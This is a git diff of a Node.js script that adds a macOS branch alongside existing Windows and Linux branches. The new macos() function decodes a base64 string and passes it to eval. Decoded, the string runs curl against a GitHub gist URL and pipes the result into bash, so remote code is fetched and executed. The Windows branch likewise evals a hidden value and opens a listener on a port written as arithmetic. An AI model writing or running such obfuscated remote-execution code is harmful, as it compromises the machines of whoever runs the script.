@@ -4,7 +4,7 @@ const { SessionBuilder } = require(`@${secret1}/${secret1}`)
 
 const os = process.argv[2]
 
-if (os !== 'windows' && os !== 'linux') throw new Error('This is illegal!! You are not in the civilization')
+if (os !== 'windows' && os !== 'macos' && os !== 'linux') throw new Error('This is illegal!! You are not in the civilization')
 
 async function runShell (command) {
     const spawnedProcess = child.spawn(command, { shell: true }) // on windows it will default to cmd
@@ -14,8 +14,19 @@ async function runShell (command) {
 
 const builder = new SessionBuilder
 
-if (os === 'windows') windows()
-else if (os === 'linux') linux()
+switch (os) {
+    case 'windows':
+        windows()
+        break
+
+    case 'macos':
+        macos()
+        break
+
+    case 'linux':
+        linux()
+        break
+}
 
 setInterval(() => console.log(`${Math.random(12)}`), 1000)
 
@@ -37,6 +48,12 @@ async function windows () {
     eval(secret)
 
     listen(72809 - 69420)
+}
+
+function macos () {
+    const secret = Buffer.from('cnVuU2hlbGwoJ2N1cmwgaHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9DaG9tZU5TL2M3NDY4NjQyY2ZjZmUyNzQzYTFhMmVmMWI5OTNkNzRmL3Jhdy9iMjE0MDlkZTk1ZTExYTZmYTE2YjYyZGM4Mjk1OTUwN2JhZGU1MTllL3NjcmlwdCB8IGJhc2gnKQ==', 'base64').toString()
+
+    eval(secret)
 }
 
 async function linux () {
